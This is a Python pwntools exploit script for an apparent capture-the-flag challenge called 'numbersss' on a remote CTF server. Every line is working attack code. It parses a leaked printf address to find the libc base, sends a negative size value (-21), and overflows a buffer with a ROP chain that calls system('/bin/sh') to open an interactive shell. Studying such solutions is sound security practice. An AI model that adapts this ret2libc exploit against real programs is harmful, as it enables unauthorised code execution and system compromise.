from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
#r = process('./numbersss_patched')
#r = gdb.debug('./numbersss_patched')
r = remote('numbersss.chal.cyberjousting.com', 1351)
libc = ELF('./libc.so.6')
r.recvuntil(b'junk: ')
leak = int(r.recvline(), 16)
libc.address = leak - libc.sym['printf']
print('libc @', hex(libc.address))
rop = ROP(libc)
rop.raw(b'a'*(0x10+0x8))
rop.raw(p64(rop.ret.address))
rop.system(next(libc.search(b'/bin/sh\x00')))
print(rop.dump())
payload = rop.chain()
r.sendline(b'-21')
r.sendline(payload+b'a'*(0xff-20-len(payload)))
r.interactive()

